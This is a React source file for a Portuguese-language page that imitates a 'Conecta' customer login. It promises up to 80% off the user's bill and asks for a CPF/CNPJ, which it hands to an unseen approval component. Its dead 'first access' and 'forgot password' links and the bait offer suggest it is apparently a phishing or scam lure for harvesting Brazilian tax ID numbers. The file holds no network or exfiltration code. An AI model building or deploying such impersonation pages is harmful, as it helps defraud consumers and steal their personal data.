// src/pages/VerificaCpf.tsx
import { useState } from "react";
import centralIcon from "../assets/central.svg";
import conectaLogo from "../assets/conecta-logo.svg";
import AprovadoInline from "../components/AprovadoInline";

export default function VerificaCpf() {
  const [cpf, setCpf] = useState("");
  const [cpfConfirmado, setCpfConfirmado] = useState<string | null>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cpf.trim()) {
      alert("Digite um CPF válido");
      return;
    }
    setCpfConfirmado(cpf.trim());
  };

  return (
    <div className="min-h-screen bg-[#ff6a00] flex flex-col items-center justify-center font-montserrat px-4">
      {/* ✅ LOGO NO TOPO */}
      <img
        src={conectaLogo}
        alt="Logo Conecta"
        className="w-32 sm:w-40 mb-4 animate-fade-in"
      />

      {/* Mensagem de destaque */}
      <h1 className="text-white text-xl sm:text-3xl font-bold text-center mb-6 animate-pulse">
        🎉 Você pode ter até <span className="underline">80% de desconto</span> na sua fatura atual!
      </h1>

      {/* Container do formulário */}
      <div className="bg-white w-full max-w-4xl rounded-md overflow-hidden shadow-2xl flex flex-col sm:flex-row">
        {/* Lado esquerdo com ícone */}
        <div className="bg-[#ff6a00] flex justify-center items-center p-8 sm:w-1/2">
          <img src={centralIcon} alt="Ícone central" className="w-28 h-28 sm:w-32 sm:h-32" />
        </div>

        {/* Lado direito com o formulário de CPF */}
        <div className="sm:w-1/2 p-8">
          {/* Tabs no topo */}
          <div className="flex text-center text-sm font-bold">
            <div className="w-1/3 text-white bg-[#ff6a00] py-3">MINHA CONECTA</div>
         
          </div>

          {/* Formulário */}
          <form onSubmit={handleSubmit} className="mt-8">
            <label htmlFor="cpf" className="block text-sm font-bold mb-1 text-[#ff6a00]">
              Login: <span className="text-red-600">*</span>
            </label>
            <input
              id="cpf"
              type="text"
              placeholder="CPF / CNPJ"
              value={cpf}
              onChange={(e) => setCpf(e.target.value)}
              className="w-full px-4 py-3 rounded-full border border-gray-300 mb-6 focus:outline-none"
            />

            <button
              type="submit"
              className="w-full bg-[#1e2f70] text-white font-bold py-3 rounded-full hover:scale-105 transition-transform"
            >
              ENTRAR
            </button>
          </form>

          <div className="text-sm text-[#ff6a00] mt-4 text-center font-semibold">
            <a href="#">Primeiro acesso</a> | <a href="#">Esqueci minha senha</a>
          </div>
        </div>
      </div>

      {/* 🔽 Resultado/Desconto abaixo do mesmo quadrado */}
      {cpfConfirmado && (
        <div className="w-full max-w-4xl mt-4">
          <AprovadoInline cpf={cpfConfirmado} />
        </div>
      )}
    </div>
  );
}
